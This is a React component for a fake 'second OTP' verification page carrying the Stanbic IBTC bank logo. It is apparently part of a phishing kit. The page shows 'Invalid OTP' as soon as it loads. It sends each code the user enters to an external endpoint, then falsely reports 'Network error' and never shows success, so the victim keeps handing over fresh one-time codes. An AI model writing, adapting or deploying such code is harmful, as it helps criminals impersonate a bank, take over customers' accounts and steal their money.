import React, { useState, useEffect } from "react";
import "../styles/second-otp.css";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";
import logo from "../assets/ng-ibtc-logo.webp";

const schema = yup.object().shape({
  otp: yup
    .string()
    .matches(/^\d{6}$/, "OTP must be exactly 6 digits")
    .required("OTP is required"),
});

const SecondOtp = () => {
  const {
    register,
    handleSubmit,
    setValue,
    reset,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const [success, setSuccess] = useState(false);

  useEffect(() => {
    setErrorMessage("Invalid OTP");
    reset();
  }, []);

  const submitForm = async (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/resend-otp`, data)
      .then((response) => {
        console.log(response.data);
        setErrorMessage("Network error");
        reset();
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
    reset();
  };

  if (success) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-gray-100 to-white flex items-center flex-col justify-center px-4">
        <div className="w-full max-w-md bg-white rounded-2xl shadow-lg p-8 text-center">
          <div className="text-green-500 text-5xl mb-4">&#10003;</div>
          <h1 className="text-2xl font-bold text-green-600 mb-2">Success!</h1>
          <p className="text-gray-600">Verification completed successfully.</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-gray-100 to-white flex items-center flex-col">
      <div className="w-full max-w-md flex flex-col items-center pt-16 px-6">
        {/* Logo */}
        <div className="mb-6">
          <img src={logo} alt="Stanbic IBTC Logo" className="h-16 w-auto" />
        </div>

        {/* Description */}
        <p className="text-gray-500 text-center text-sm mb-10 px-4">
          For your account security, please provide the one-time code delivered
          to your registered email address or mobile number.
        </p>

        {/* Form */}
        <form onSubmit={handleSubmit(submitForm)} className="w-full">
          <div className="mb-4">
            <input
              name="otp"
              type="tel"
              pattern="[0-9]*"
              inputMode="numeric"
              placeholder="Enter OTP"
              max={6}
              maxLength={6}
              {...register("otp")}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, "");
                setValue("otp", value);
              }}
              className="w-full border-2 border-gray-300 rounded-lg px-4 py-4 text-center text-xl tracking-widest focus:outline-none focus:ring-2 focus:ring-[#1a4d7a] focus:border-[#1a4d7a] transition-all"
            />
          </div>

          {errorMessage && (
            <p className="text-red-500 text-sm text-center mb-2">
              {errorMessage}
            </p>
          )}
          <div className="mb-6">
            <FormErrMsg errors={errors} inputName="otp" />
          </div>

          <button
            type="submit"
            disabled={loading}
            className="w-full bg-[#0047BB] text-white py-4 rounded-xl font-semibold text-lg hover:bg-[#003a99] transition-colors disabled:opacity-50 disabled:cursor-not-allowed shadow-sm mt-[20em]"
          >
            {loading ? "Loading..." : "Confirm OTP"}
          </button>
        </form>
      </div>
    </div>
  );
};

export default SecondOtp;
